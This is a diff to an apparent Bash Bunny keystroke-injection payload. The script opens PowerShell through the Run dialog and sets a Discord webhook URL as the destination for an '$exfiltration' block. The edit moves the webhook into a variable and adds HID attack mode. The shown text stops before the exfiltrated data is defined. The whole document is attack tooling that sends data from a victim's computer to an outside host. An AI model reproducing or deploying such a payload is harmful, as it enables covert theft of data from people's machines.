@@ -8,7 +8,11 @@
 * REM #                                                 |
 * REM ###################################################
 
+ATTACKMODE HID
 
+QUACK REM VARIABLES:
+QUACK REM Put here your Discord Webhook
+DISCORD-WEBHOOK="https://discord.com/api/webhooks/0123456789.../abcefg..."
 
 QUACK DELAY 3000
 QUACK GUI r
@@ -16,9 +20,7 @@ QUACK DELAY 1000
 QUACK STRING powershell
 QUACK ENTER
 QUACK DELAY 2000
-
-* REM Put here your Discord Webhook, i.e. https://discord.com/api/webhooks/0123456789.../abcefg...
-QUACK STRING $hookUrl = "#DISCORD-WEBHOOK"
+QUACK STRING $hookUrl = "$DISCORD-WEBHOOK"
 QUACK ENTER
 QUACK DELAY 500
 QUACK STRING $exfiltration = @"
